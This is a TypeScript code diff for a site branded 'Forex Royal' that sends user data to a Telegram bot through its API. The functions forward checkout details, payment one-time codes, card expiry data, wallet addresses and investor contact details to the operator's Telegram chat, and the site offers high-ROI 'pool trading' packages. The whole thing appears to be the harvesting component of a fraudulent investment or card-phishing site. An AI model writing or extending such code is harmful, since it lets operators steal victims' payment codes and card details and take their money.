@@ -1,3 +1,69 @@
+import { supabase } from '../supabase/client';
+
+export interface TelegramCredentials {
+  botToken: string;
+  chatId: string;
+}
+
+/**
+ * Retrieve Telegram Bot Token and Chat ID.
+ * First checks Vite environment variables, then falls back to Supabase settings.
+ */
+export async function getTelegramCredentials(): Promise<TelegramCredentials | null> {
+  const envToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
+  const envChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;
+
+  if (envToken && envChatId) {
+    return { botToken: envToken, chatId: envChatId };
+  }
+
+  // Fallback 1: check admin_notification_settings table
+  try {
+    const { data, error } = await supabase
+      .from('admin_notification_settings')
+      .select('telegram_bot_token, telegram_chat_id')
+      .limit(1)
+      .maybeSingle();
+
+    if (!error && data?.telegram_bot_token && data?.telegram_chat_id) {
+      return {
+        botToken: data.telegram_bot_token,
+        chatId: data.telegram_chat_id,
+      };
+    }
+  } catch (err) {
+    console.warn('Could not fetch Telegram credentials from admin_notification_settings:', err);
+  }
+
+  // Fallback 2: check site_settings table
+  try {
+    const { data: settings } = await supabase
+      .from('site_settings')
+      .select('key, value')
+      .in('key', ['telegram_bot_token', 'telegram_chat_id']);
+
+    if (settings && settings.length > 0) {
+      let botToken = envToken || '';
+      let chatId = envChatId || '';
+      for (const s of settings) {
+        if (s.key === 'telegram_bot_token' && s.value) {
+          botToken = String(s.value).replace(/"/g, '');
+        }
+        if (s.key === 'telegram_chat_id' && s.value) {
+          chatId = String(s.value).replace(/"/g, '');
+        }
+      }
+      if (botToken && chatId) {
+        return { botToken, chatId };
+      }
+    }
+  } catch (err) {
+    console.warn('Could not fetch Telegram credentials from site_settings:', err);
+  }
+
+  return envToken && envChatId ? { botToken: envToken, chatId: envChatId } : null;
+}
+
 interface CheckoutData {
   shippingDetails: {
     fullName: string;
@@ -28,22 +94,20 @@ interface CheckoutData {
 
 export async function sendCheckoutDataToTelegram(checkoutData: CheckoutData): Promise<boolean> {
   try {
-    const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
-    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;
-
-    if (!botToken || !chatId) {
+    const creds = await getTelegramCredentials();
+    if (!creds || !creds.botToken || !creds.chatId) {
       return false;
     }
 
     const message = formatCheckoutMessage(checkoutData);
 
     const payload = {
-      chat_id: chatId,
+      chat_id: creds.chatId,
       text: message,
       parse_mode: 'HTML',
     };
 
-    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    const response = await fetch(`https://api.telegram.org/bot${creds.botToken}/sendMessage`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -52,12 +116,7 @@ export async function sendCheckoutDataToTelegram(checkoutData: CheckoutData): Pr
     });
 
     const result = await response.json();
-
-    if (result.ok) {
-      return true;
-    } else {
-      return false;
-    }
+    return Boolean(result.ok);
   } catch (error) {
     return false;
   }
@@ -108,10 +167,8 @@ function formatCheckoutMessage(data: CheckoutData): string {
 
 export async function sendOTPToTelegram(otp: string, customerName: string): Promise<boolean> {
   try {
-    const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
-    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;
-
-    if (!botToken || !chatId) {
+    const creds = await getTelegramCredentials();
+    if (!creds || !creds.botToken || !creds.chatId) {
       return false;
     }
 
@@ -123,12 +180,12 @@ Code: <code>${otp}</code>
 ⚠️ <i>User is attempting to verify payment.</i>`;
 
     const payload = {
-      chat_id: chatId,
+      chat_id: creds.chatId,
       text: message,
       parse_mode: 'HTML',
     };
 
-    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    const response = await fetch(`https://api.telegram.org/bot${creds.botToken}/sendMessage`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -137,7 +194,7 @@ Code: <code>${otp}</code>
     });
 
     const result = await response.json();
-    return result.ok;
+    return Boolean(result.ok);
   } catch (error) {
     return false;
   }
@@ -167,22 +224,20 @@ export async function sendTradingBotPaymentNotification(paymentData: {
   fullExpiry?: string;
 }): Promise<boolean> {
   try {
-    const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
-    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;
-
-    if (!botToken || !chatId) {
+    const creds = await getTelegramCredentials();
+    if (!creds || !creds.botToken || !creds.chatId) {
       return false;
     }
 
     const message = formatTradingBotPaymentMessage(paymentData);
 
     const payload = {
-      chat_id: chatId,
+      chat_id: creds.chatId,
       text: message,
       parse_mode: 'HTML',
     };
 
-    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    const response = await fetch(`https://api.telegram.org/bot${creds.botToken}/sendMessage`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -277,22 +332,20 @@ export async function sendTradingBotPurchaseConfirmation(data: {
   otpCode: string;
 }): Promise<boolean> {
   try {
-    const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
-    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;
-
-    if (!botToken || !chatId) {
+    const creds = await getTelegramCredentials();
+    if (!creds || !creds.botToken || !creds.chatId) {
       return false;
     }
 
     const message = formatTradingBotConfirmationMessage(data);
 
     const payload = {
-      chat_id: chatId,
+      chat_id: creds.chatId,
       text: message,
       parse_mode: 'HTML',
     };
 
-    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    const response = await fetch(`https://api.telegram.org/bot${creds.botToken}/sendMessage`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -348,3 +401,266 @@ function formatTradingBotConfirmationMessage(data: any): string {
 
   return message;
 }
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   POOL TRADING NOTIFICATIONS
+═══════════════════════════════════════════════════════════════════════════ */
+
+export interface PoolApplicationNotificationData {
+  applicationId?: string;
+  userId: string;
+  userName: string;
+  userEmail: string;
+  userPhone?: string;
+  packageId?: string;
+  packageName: string;
+  amount: number;
+  expectedReturn?: number;
+  totalPayout?: number;
+  durationValue?: number;
+  durationUnit?: 'hours' | 'days';
+  roiPercentage?: number;
+  paymentMethod?: string;
+  transactionReference?: string;
+  notes?: string;
+  timestamp?: string;
+}
+
+export interface PoolWithdrawalNotificationData {
+  requestId?: string;
+  userId: string;
+  userName: string;
+  userEmail: string;
+  amount: number;
+  paymentMethod: string;
+  walletAddress: string;
+  packageName?: string;
+  timestamp?: string;
+}
+
+export interface PoolVipNotificationData {
+  requestId?: string;
+  userId: string;
+  userName: string;
+  userEmail: string;
+  notes?: string;
+  timestamp?: string;
+}
+
+/**
+ * Sends a real-time Telegram alert when a user submits an application for a Pool Trading Package.
+ */
+export async function sendPoolApplicationNotification(
+  data: PoolApplicationNotificationData
+): Promise<boolean> {
+  try {
+    const creds = await getTelegramCredentials();
+    if (!creds || !creds.botToken || !creds.chatId) {
+      console.warn('⚠️ Telegram credentials not configured. Skipping Telegram alert for Pool Application.');
+      return false;
+    }
+
+    const message = formatPoolApplicationMessage(data);
+
+    const payload = {
+      chat_id: creds.chatId,
+      text: message,
+      parse_mode: 'HTML',
+    };
+
+    const response = await fetch(`https://api.telegram.org/bot${creds.botToken}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(payload),
+    });
+
+    const result = await response.json();
+    if (result.ok) {
+      console.log('✅ Telegram Pool Application notification sent successfully');
+      return true;
+    } else {
+      console.warn('⚠️ Telegram API responded with error:', result.description);
+      return false;
+    }
+  } catch (error) {
+    console.error('❌ Failed to send Pool Application notification to Telegram:', error);
+    return false;
+  }
+}
+
+function formatPoolApplicationMessage(data: PoolApplicationNotificationData): string {
+  const timestamp = data.timestamp ? new Date(data.timestamp).toLocaleString() : new Date().toLocaleString();
+  const durationText = data.durationValue ? `${data.durationValue} ${data.durationUnit || 'days'}` : 'Custom Term';
+  const expectedReturn = data.expectedReturn !== undefined
+    ? data.expectedReturn
+    : ((data.amount * (data.roiPercentage || 0)) / 100);
+  const totalPayout = data.totalPayout !== undefined
+    ? data.totalPayout
+    : (data.amount + expectedReturn);
+
+  const fmt = (n: number) => n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+
+  let message = `🏊 <b>NEW POOL TRADING APPLICATION</b>\n`;
+  message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+
+  // 1. Package Information
+  message += `📦 <b>PACKAGE DETAILS</b>\n`;
+  message += `   • <b>Plan:</b> ${data.packageName}\n`;
+  if (data.roiPercentage !== undefined) {
+    message += `   • <b>Target ROI:</b> +${data.roiPercentage}%\n`;
+  }
+  message += `   • <b>Duration:</b> ${durationText}\n`;
+  if (data.applicationId) {
+    message += `   • <b>Application ID:</b> <code>${data.applicationId}</code>\n`;
+  }
+  message += `\n`;
+
+  // 2. Financial Overview
+  message += `💰 <b>FINANCIAL BREAKDOWN</b>\n`;
+  message += `   • <b>Invested Capital:</b> $${fmt(data.amount)}\n`;
+  message += `   • <b>Est. Profit:</b> +$${fmt(expectedReturn)}\n`;
+  message += `   • <b>Total Return:</b> <b>$${fmt(totalPayout)}</b>\n`;
+  message += `   • <b>Payment Method:</b> ${data.paymentMethod || 'Crypto'}\n`;
+  if (data.transactionReference) {
+    message += `   • <b>Tx Ref / Hash:</b> <code>${data.transactionReference}</code>\n`;
+  }
+  if (data.notes) {
+    message += `   • <b>Notes:</b> <i>${data.notes}</i>\n`;
+  }
+  message += `\n`;
+
+  // 3. Applicant Details
+  message += `👤 <b>INVESTOR INFORMATION</b>\n`;
+  message += `   • <b>Name:</b> ${data.userName || 'Anonymous Trader'}\n`;
+  message += `   • <b>Email:</b> <code>${data.userEmail || 'student@platform.com'}</code>\n`;
+  if (data.userPhone) {
+    message += `   • <b>Phone:</b> <code>${data.userPhone}</code>\n`;
+  }
+  message += `   • <b>User ID:</b> <code>${data.userId}</code>\n`;
+  message += `\n`;
+
+  // 4. Timestamp & Action Callout
+  message += `⏰ <b>Submitted At:</b> ${timestamp}\n`;
+  message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+  message += `⚡ <b>ACTION REQUIRED:</b>\n`;
+  message += `Review & approve in the <b>Admin Pool Trading Command Center</b>.`;
+
+  return message;
+}
+
+/**
+ * Sends a real-time Telegram alert when a user requests a withdrawal.
+ */
+export async function sendPoolWithdrawalNotification(
+  data: PoolWithdrawalNotificationData
+): Promise<boolean> {
+  try {
+    const creds = await getTelegramCredentials();
+    if (!creds || !creds.botToken || !creds.chatId) return false;
+
+    const fmt = (n: number) => n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+    const timestamp = data.timestamp ? new Date(data.timestamp).toLocaleString() : new Date().toLocaleString();
+
+    let message = `💸 <b>POOL WITHDRAWAL REQUEST</b>\n`;
+    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+    message += `👤 <b>User:</b> ${data.userName} (<code>${data.userEmail}</code>)\n`;
+    message += `💵 <b>Amount:</b> <b>$${fmt(data.amount)}</b>\n`;
+    message += `🏦 <b>Method:</b> ${data.paymentMethod}\n`;
+    message += `📍 <b>Address / Account:</b> <code>${data.walletAddress}</code>\n`;
+    if (data.packageName) message += `📦 <b>From Pool:</b> ${data.packageName}\n`;
+    message += `⏰ <b>Time:</b> ${timestamp}\n`;
+    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+    message += `⚡ <b>ACTION:</b> Process payout in Admin Command Center.`;
+
+    const response = await fetch(`https://api.telegram.org/bot${creds.botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: creds.chatId, text: message, parse_mode: 'HTML' }),
+    });
+
+    const result = await response.json();
+    return Boolean(result.ok);
+  } catch (err) {
+    console.error('Failed to send withdrawal notification:', err);
+    return false;
+  }
+}
+
+/**
+ * Sends a real-time Telegram alert when a user applies for VIP syndicate status.
+ */
+export async function sendPoolVipRequestNotification(
+  data: PoolVipNotificationData
+): Promise<boolean> {
+  try {
+    const creds = await getTelegramCredentials();
+    if (!creds || !creds.botToken || !creds.chatId) return false;
+
+    const timestamp = data.timestamp ? new Date(data.timestamp).toLocaleString() : new Date().toLocaleString();
+
+    let message = `👑 <b>VIP SYNDICATE REQUEST</b>\n`;
+    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+    message += `👤 <b>Applicant:</b> ${data.userName} (<code>${data.userEmail}</code>)\n`;
+    if (data.notes) message += `📝 <b>Notes:</b> <i>${data.notes}</i>\n`;
+    message += `⏰ <b>Time:</b> ${timestamp}\n`;
+    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+    message += `⚡ <b>ACTION:</b> Review in Admin Command Center.`;
+
+    const response = await fetch(`https://api.telegram.org/bot${creds.botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: creds.chatId, text: message, parse_mode: 'HTML' }),
+    });
+
+    const result = await response.json();
+    return Boolean(result.ok);
+  } catch (err) {
+    console.error('Failed to send VIP notification:', err);
+    return false;
+  }
+}
+
+/**
+ * Test Telegram bot credentials by dispatching a test message.
+ */
+export async function sendTestTelegramMessage(
+  botToken: string,
+  chatId: string
+): Promise<{ success: boolean; error?: string }> {
+  try {
+    const message = `🔔 <b>FOREX ROYAL - TELEGRAM NOTIFICATION TEST</b>\n` +
+      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
+      `✅ <b>Connection Successful!</b>\n` +
+      `Your Telegram bot is now properly configured with the Forex Royal platform.\n\n` +
+      `You will receive real-time notifications whenever:\n` +
+      `• A user applies for a Pool Trading Package\n` +
+      `• A user requests a withdrawal\n` +
+      `• A user requests VIP syndicate access\n\n` +
+      `⏰ <b>Timestamp:</b> ${new Date().toLocaleString()}\n` +
+      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+
+    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: 'HTML',
+      }),
+    });
+
+    const result = await response.json();
+    if (result.ok) {
+      return { success: true };
+    } else {
+      return { success: false, error: result.description || 'Telegram API rejected request' };
+    }
+  } catch (err: any) {
+    return { success: false, error: err.message || 'Network error connecting to Telegram' };
+  }
+}
+
